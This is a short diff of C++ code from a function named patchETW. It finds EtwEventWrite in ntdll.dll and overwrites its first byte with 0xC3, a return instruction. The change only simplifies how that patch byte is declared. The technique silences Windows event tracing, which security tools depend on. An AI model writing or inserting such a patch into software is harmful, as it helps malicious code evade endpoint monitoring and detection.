@@ -43,9 +43,7 @@ void patchETW(OUT HANDLE& hProc) {
 
     void* etwAddr = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "EtwEventWrite");
     
-    char etwPatch[4];
-    char d[] = { 0xC3 };
-    memcpy(etwPatch, d, sizeof(d));
+    char etwPatch[] = { 0xC3 };
     
     DWORD lpflOldProtect = 0;
     unsigned __int64 memPage = 0x1000;
